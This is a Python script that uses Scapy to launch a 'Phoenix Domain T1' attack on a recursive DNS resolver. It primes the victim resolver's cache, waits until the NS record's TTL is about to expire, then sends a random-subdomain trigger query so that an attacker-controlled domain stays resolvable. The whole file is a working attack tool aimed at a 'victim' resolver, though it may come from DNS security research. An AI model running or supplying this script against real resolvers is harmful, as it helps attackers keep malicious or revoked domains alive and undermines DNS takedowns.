import argparse
import time
import random
import string
import socket
from scapy.all import IP, UDP, DNS, DNSQR, sr1, send, conf

# --- Helper Function ---
def generate_random_subdomain(length=10):
    """Generates a random string to use as a unique subdomain."""
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choices(letters, k=length))

def run_attack(resolver_ip, domain, initial_ttl, delay_before_attack):
    """
    Executes the two-query Phoenix Domain T1 attack using Scapy.
    """
    # Scapy can be verbose, let's quiet it down for a cleaner output
    conf.verb = 0

    print("--- T1 Attack Launcher ---")
    print(f"  Target Resolver: {resolver_ip}")
    print(f"  Malicious Domain : {domain}")
    print(f"  Initial TTL      : {initial_ttl} seconds")
    print(f"  Wait Time        : {delay_before_attack} seconds")
    print("--------------------------\n")

    # --- Step 1: Prime the Victim Resolver's Cache ---
    prime_subdomain = f"www.{domain}"
    print(f"[1] Sending PRIMING query for '{prime_subdomain}' to {resolver_ip}...")
    
    # Construct the first DNS query packet
    priming_packet = IP(dst=resolver_ip) / UDP(dport=53) / DNS(
        id=random.randint(0, 65535),
        rd=1,  # Recursion Desired
        qd=DNSQR(qname=prime_subdomain, qtype='A')
    )
    
    # Send the packet and wait for a response
    response = sr1(priming_packet, timeout=5)
    
    if response and response.haslayer(DNS) and response[DNS].an:
        print(f"[+] SUCCESS: Priming query successful. Resolver responded with IP: {response[DNS].an.rdata}")
        print(f"[*] The cache TTL is now counting down from {initial_ttl} seconds.")
    elif response:
        print("[!] WARNING: Resolver responded, but not with an A record. Check your authoritative server.")
    else:
        print("[!] FAILED: No response from resolver. Is the IP correct and reachable?")
        return

    # --- Step 2: Wait until just before the TTL expires ---
    print(f"\n[2] Waiting for {delay_before_attack} seconds...")
    time.sleep(delay_before_attack)
    print("[*] Wait complete. The original cache entry is now about to expire.")

    # --- Step 3: Send the Attack Trigger Query ---
    # We use a NEW, random subdomain to ensure a cache miss for the record itself.
    attack_subdomain = f"{generate_random_subdomain()}.{domain}"
    print(f"\n[3] Sending ATTACK TRIGGER query for '{attack_subdomain}'...")
    print("[*] This forces the resolver to use its almost-expired NS record.")
    
    # Construct the second DNS query packet
    attack_packet = IP(dst=resolver_ip) / UDP(dport=53) / DNS(
        id=random.randint(0, 65535),
        rd=1,
        qd=DNSQR(qname=attack_subdomain, qtype='A')
    )
    
    # Send the packet. We don't need to wait for the response here.
    # The simple act of sending it triggers the process. The attacker's
    # authoritative server will handle the response delay.
    send(attack_packet)
    
    print("[+] SUCCESS: Attack trigger query sent!")
    print("[*] The victim resolver should now be querying your authoritative server,")
    print("[*] which should be delaying its response to cross the TTL boundary.")
    print("\n--- Attack Launched ---")
    print("Check your authoritative server's logs for the incoming query.")
    print("After a few seconds, you can try querying the domain again to verify if it's still resolvable.")

def main():
    parser = argparse.ArgumentParser(
        description="Scapy-based client to launch a Phoenix Domain T1 attack.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        'resolver', 
        help="The IP address of the victim recursive resolver."
    )
    parser.add_argument(
        'domain', 
        help="The malicious domain you control (e.g., phoenix-test.lab)."
    )
    parser.add_argument(
        '--ttl', 
        type=int, 
        required=True,
        help="The initial TTL (in seconds) set on your authoritative server's NS records."
    )
    parser.add_argument(
        '--delay', 
        type=float,
        help="(Optional) The time to wait between the priming and attack queries.\n"
             "This should be slightly less than the TTL. \n"
             "Default: TTL - 5 seconds."
    )

    args = parser.parse_args()

    # Calculate the delay if not provided
    delay_before_attack = args.delay
    if delay_before_attack is None:
        delay_before_attack = args.ttl - 5
        if delay_before_attack < 1:
            delay_before_attack = 1
    
    if delay_before_attack >= args.ttl:
        print("[!!!] Error: Delay must be less than the TTL.")
        return
        
    run_attack(args.resolver, args.domain, args.ttl, delay_before_attack)

if __name__ == "__main__":
    main()